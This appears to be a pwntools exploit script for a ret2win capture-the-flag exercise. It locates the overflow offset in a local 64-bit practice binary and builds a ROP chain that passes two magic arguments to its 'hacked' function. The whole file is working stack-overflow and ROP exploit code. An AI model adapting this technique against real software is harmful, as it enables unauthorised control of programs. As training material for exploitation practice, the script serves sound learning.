from pwn import *

exe = './ret2win_params_64bit'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

def find_IP(payload):
    p = process(exe)
    p.sendlineafter(b':', payload)
    p.wait()

    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))
    return ip_offset

offset = find_IP(cyclic(200))
io = process(exe)
pop_rdi = 0x40124b
pop_rsi_r15 = 0x401249

payload = flat({
        offset:[
            pop_rdi,
            0xdeadbeefdeadbeef,
            pop_rsi_r15,
            0xc0debabec0debabe,
            0x0,
            elf.functions.hacked
            ]
    })

write('payload', payload)
io.sendlineafter(b':', payload)
io.interactive()
